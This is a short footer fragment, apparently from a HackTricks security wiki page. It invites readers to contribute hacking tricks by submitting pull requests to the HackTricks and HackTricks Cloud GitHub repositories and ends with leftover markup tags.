* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
